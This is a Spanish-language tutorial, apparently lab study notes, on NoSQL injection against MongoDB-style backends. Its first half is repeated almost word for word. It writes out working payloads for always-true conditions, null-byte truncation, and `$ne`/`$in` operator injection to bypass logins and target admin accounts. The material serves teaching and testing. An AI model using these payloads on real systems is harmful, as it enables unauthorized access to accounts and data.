# NoSQL Injection



Una **NoSQL Injection** es una vulnerabilidad de seguridad que permite a un atacante manipular las consultas realizadas por una aplicación hacia una base de datos NoSQL. A diferencia de las bases de datos relacionales SQL, las NoSQL (como MongoDB, CouchDB, Firebase, etc.) utilizan distintos lenguajes de consulta, estructuras de datos flexibles y menos restricciones relacionales.

Esta vulnerabilidad puede permitir a un atacante:

* Bypassear mecanismos de autenticación o autorización.
* Leer, modificar o eliminar datos arbitrarios.
* Ejecutar código en el servidor (en algunos entornos).
* Causar denegación de servicio.

---

## 🧰 ¿Cómo funciona?

Las aplicaciones modernas muchas veces reciben datos del cliente (formularios, URLs, JSON) que luego utilizan para construir consultas hacia la base de datos. Si estos datos no son validados correctamente, un atacante podría inyectar fragmentos de código malicioso que se ejecuten como parte de la consulta NoSQL.

---

## ✍️ Tipos de NoSQL Injection

### 1. Inyección de Sintaxis (Syntax Injection)

El atacante puede modificar la sintaxis de la consulta con caracteres especiales, logrando alterar su comportamiento.

Ejemplo:

```js
// Consulta en MongoDB:
db.products.find({ category: userInput })
```

Si `userInput` es:

```js
"fizzy'||'1'=='1"
```

Entonces la consulta queda:

```js
{ category: 'fizzy'||'1'=='1' }
```

Esto puede devolver todos los productos sin importar su categoría.

### 2. Inyección de Operadores (Operator Injection)

El atacante utiliza operadores de la base NoSQL como `$ne`, `$gt`, `$regex`, `$where`, etc., para alterar la consulta sin romper la sintaxis.

Ejemplo:

```json
{
  "username": { "$ne": null },
  "password": { "$ne": null }
}
```

Esto puede saltarse una autenticación básica si no se sanitizan los campos.

---

## 🔢 MongoDB como objetivo principal

MongoDB es una de las bases de datos NoSQL más utilizadas y es muy propensa a este tipo de vulnerabilidades cuando se trabaja con datos JSON desde el cliente.

### Consulta común:

```js
// URL:
https://inseguro.com/product/lookup?category=fizzy

// Query que ejecuta:
this.category == 'fizzy'
```

---

## 🔍 Detectando NoSQL Injection (fuzzing)

### Prueba con cadenas especiales:

Probar si el input del parámetro `category` permite alterar la sintaxis:

```
category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```

Versión decodificada:

```js
"`{
;$Foo}
$Foo \xYZ\0
```

Cambios inesperados en la respuesta pueden indicar procesamiento no seguro del input.

### Prueba con comillas simples:

```
category='
```

Consulta generada:

```
this.category == '''
```

Si se rompe la consulta, podría indicar un punto de inyección.

---

## 🔠 Confirmando comportamiento condicional

Una técnica común es inyectar condiciones booleanas:

* Falsa:

```
fizzy' && 0 && 'x
```

* Verdadera:

```
fizzy' && 1 && 'x
```

Si la aplicación responde distinto para ambas, entonces el input modifica la lógica del servidor.

---

## 🔫 Anulando condiciones

Una vez que se sabe que la inyección funciona, se puede intentar inyectar una condición siempre verdadera:

Payload:

```
fizzy'||'1'=='1
```

URL codificada:

```
category=fizzy%27%7c%7c%271%27%3d%3d%271
```

Consulta resultante:

```
this.category == 'fizzy' || '1'=='1'
```

---

[Lab: Detecting NoSQL injection](1_Detecting_NoSQL_injection.md)  

![Practitioner](https://img.shields.io/badge/level-Apprentice-green) 

---

# NoSQL Injection

Una **NoSQL Injection** es una vulnerabilidad de seguridad que permite a un atacante manipular las consultas realizadas por una aplicación hacia una base de datos NoSQL. A diferencia de las bases de datos relacionales SQL, las NoSQL (como MongoDB, CouchDB, Firebase, etc.) utilizan distintos lenguajes de consulta, estructuras de datos flexibles y menos restricciones relacionales.

Esta vulnerabilidad puede permitir a un atacante:

* Bypassear mecanismos de autenticación o autorización.
* Leer, modificar o eliminar datos arbitrarios.
* Ejecutar código en el servidor (en algunos entornos).
* Causar denegación de servicio.

---

## 🧰 ¿Cómo funciona?

Las aplicaciones modernas muchas veces reciben datos del cliente (formularios, URLs, JSON) que luego utilizan para construir consultas hacia la base de datos. Si estos datos no son validados correctamente, un atacante podría inyectar fragmentos de código malicioso que se ejecuten como parte de la consulta NoSQL.

---

## ✍️ Tipos de NoSQL Injection

### 1. Inyección de Sintaxis (Syntax Injection)

El atacante puede modificar la sintaxis de la consulta con caracteres especiales, logrando alterar su comportamiento.

Ejemplo:

```js
// Consulta en MongoDB:
db.products.find({ category: userInput })
```

Si `userInput` es:

```js
"fizzy'||'1'=='1"
```

Entonces la consulta queda:

```js
{ category: 'fizzy'||'1'=='1' }
```

Esto puede devolver todos los productos sin importar su categoría.

### 2. Inyección de Operadores (Operator Injection)

El atacante utiliza operadores de la base NoSQL como `$ne`, `$gt`, `$regex`, `$where`, etc., para alterar la consulta sin romper la sintaxis.

Ejemplo:

```json
{
  "username": { "$ne": null },
  "password": { "$ne": null }
}
```

Esto puede saltarse una autenticación básica si no se sanitizan los campos.

---

## 🔢 MongoDB como objetivo principal

MongoDB es una de las bases de datos NoSQL más utilizadas y es muy propensa a este tipo de vulnerabilidades cuando se trabaja con datos JSON desde el cliente.

### Consulta común:

```js
// URL:
https://inseguro.com/product/lookup?category=fizzy

// Query que ejecuta:
this.category == 'fizzy'
```

---

## 🔍 Detectando NoSQL Injection (fuzzing)

### Prueba con cadenas especiales:

Probar si el input del parámetro `category` permite alterar la sintaxis:

```
category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```

Versión decodificada:

```js
"`{
;$Foo}
$Foo \xYZ\0
```

Cambios inesperados en la respuesta pueden indicar procesamiento no seguro del input.

### Prueba con comillas simples:

```
category='
```

Consulta generada:

```
this.category == '''
```

Si se rompe la consulta, podría indicar un punto de inyección.

---

## 🔠 Confirmando comportamiento condicional

Una técnica común es inyectar condiciones booleanas:

* Falsa:

```
fizzy' && 0 && 'x
```

* Verdadera:

```
fizzy' && 1 && 'x
```

Si la aplicación responde distinto para ambas, entonces el input modifica la lógica del servidor.

---

## 🔫 Anulando condiciones

Una vez que se sabe que la inyección funciona, se puede intentar inyectar una condición siempre verdadera:

Payload:

```
fizzy'||'1'=='1
```

URL codificada:

```
category=fizzy%27%7c%7c%271%27%3d%3d%271
```

Consulta resultante:

```
this.category == 'fizzy' || '1'=='1'
```

Esto forzaría a MongoDB a retornar todos los productos de la categoría, sin importar si cumplen alguna condición adicional.

---

## 🧪 Usando el carácter nulo para truncar condiciones

MongoDB puede **ignorar todos los caracteres después de un carácter nulo** (`\u0000`), lo cual permite **anular condiciones adicionales** en la consulta.

Por ejemplo, si el backend implementa:

```js
this.category == 'fizzy' && this.released == 1
```

El objetivo es mostrar únicamente productos lanzados oficialmente (`released == 1`). Pero si inyectamos un null byte, como:

```
https://insecure-website.com/product/lookup?category=fizzy'%00
```

Entonces la consulta queda:

```js
this.category == 'fizzy'\u0000' && this.released == 1
```

El motor de MongoDB podría ignorar todo lo posterior al null byte, y por ende la condición `this.released == 1` no se evalúa. Esto **muestra productos no lanzados (unreleased)**.

Este tipo de ataque se conoce como **null byte truncation**.

🔎 Algunos entornos o frameworks modernos pueden prevenir esto, pero **aún se encuentra presente** en muchas implementaciones.

---

## 💣 NoSQL Operator Injection

Los motores NoSQL como MongoDB utilizan **operadores especiales** dentro de sus consultas, como:

* `$where` – Evalúa una expresión JavaScript.
* `$ne` – Distinto de...
* `$in` – Pertenece a un array.
* `$regex` – Coincidencia con expresiones regulares.

Si el input del usuario no está sanitizado, **es posible inyectar estos operadores** directamente.

### 🔧 Inyección en mensajes JSON (POST):

Supongamos una petición normal:

```json
{
  "username": "wiener",
  "password": "peter"
}
```

Podemos probar inyectando operadores:

```json
{
  "username": { "$ne": "invalid" },
  "password": "peter"
}
```

Esto consultaría: "usuarios cuyo nombre NO sea 'invalid'" y cuya password sea 'peter'.

Si el backend procesa operadores también en `password`, podríamos intentar:

```json
{
  "username": { "$ne": "invalid" },
  "password": { "$ne": "invalid" }
}
```

Esto hace match con cualquier usuario donde **ambos campos sean distintos a 'invalid'**, es decir, **devuelve todos los usuarios**.

### 🎯 Ataques más dirigidos

Podemos apuntar a un usuario específico utilizando `$in`:

```json
{
  "username": { "$in": ["admin", "administrator", "superadmin"] },
  "password": { "$ne": "" }
}
```

Esto devuelve un usuario con alguno de esos nombres y cualquier contraseña no vacía.

---

## 🛠 Técnicas para inyectar operadores

### Desde GET (parámetros de URL):

```
username[$ne]=admin&password[$ne]=1234
```

Esto puede no funcionar si el servidor no convierte correctamente estructuras tipo `key[$op]`.

### Alternativas:

* Cambiar a método `POST`
* Usar `Content-Type: application/json`
* Enviar el JSON manualmente en el cuerpo de la petición

💡 **Extensión útil**: \[Content Type Converter (Burp Suite)] permite convertir fácilmente entre `x-www-form-urlencoded` y `JSON`.

---

[Lab: Detecting NoSQL injection](1_Detecting_NoSQL_injection.md)

![Practitioner](https://img.shields.io/badge/level-Apprentice-green)

---


